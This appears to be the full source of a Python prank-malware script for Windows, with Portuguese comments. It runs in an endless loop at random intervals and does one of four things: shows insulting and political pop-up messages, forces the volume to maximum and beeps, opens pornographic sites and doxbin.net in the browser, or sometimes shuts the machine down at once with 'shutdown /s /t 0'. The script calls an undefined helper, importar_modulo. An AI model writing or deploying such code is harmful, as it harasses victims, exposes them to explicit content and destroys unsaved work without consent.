# Importa os módulos necessários
importlib = __import__("importlib")  # Garante que importlib está disponível
os = importar_modulo("os")
time = importar_modulo("time")
random = importar_modulo("random")
ctypes = importar_modulo("ctypes")
winsound = importar_modulo("winsound")
webbrowser = importar_modulo("webbrowser")

# Módulos para controle de áudio
try:
    comtypes = importar_modulo("comtypes")
    pycaw = importar_modulo("pycaw")
    AudioUtilities = pycaw.pycaw.AudioUtilities
    IAudioEndpointVolume = pycaw.pycaw.IAudioEndpointVolume
    CLSCTX_ALL = comtypes.CLSCTX_ALL
    POINTER = importar_modulo("ctypes").POINTER
    cast = importar_modulo("ctypes").cast
    pycaw_disponivel = True
except Exception:
    pycaw_disponivel = False  # Se der erro na importação, apenas ignora

mensagens = [
    "vai dormir vadia",
    "bolsonaro melhor que vc",
    "bolsonaro tomou conta desse pc"
]

sites = [
    "https://pornhub.com", 
    "https://xvideos.com",
    "https://doxbin.net"
]

def aumentar_volume():
    """Tenta aumentar o volume para o máximo. Se falhar, ignora o erro."""
    if not pycaw_disponivel:
        return  # Se pycaw não foi importado, evita erro
    
    try:
        dispositivos = AudioUtilities.GetSpeakers()
        interface = dispositivos.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(1.0, None)  # Define o volume no máximo
    except Exception as e:
        print(f"[ERRO] Não foi possível aumentar o volume: {e}")

def abrir_bloco_de_notas():
    os.system("notepad.exe")
    time.sleep(2)  # Espera um pouco para o bloco abrir
    msg = random.choice(mensagens)
    ctypes.windll.user32.MessageBoxW(0, msg, "Alerta!", 0x40 | 0x1)

def tocar_som():
    aumentar_volume()  # Garante que o volume está no máximo antes do som
    freq = random.randint(200, 2000)  # Frequência do som (Hz)
    duracao = random.randint(300, 1000)  # Duração do som (ms)
    winsound.Beep(freq, duracao)

def abrir_site():
    site = random.choice(sites)
    webbrowser.open(site)

def desligar():
    if random.randint(1, 25) == 8:  # Corrigido o erro de digitação
        os.system("shutdown /s /t 0") 

while True:
    time.sleep(random.randint(5, 25))  # Tempo aleatório entre as trollagens
    escolha = random.choice([abrir_bloco_de_notas, tocar_som, abrir_site, desligar])
    escolha()
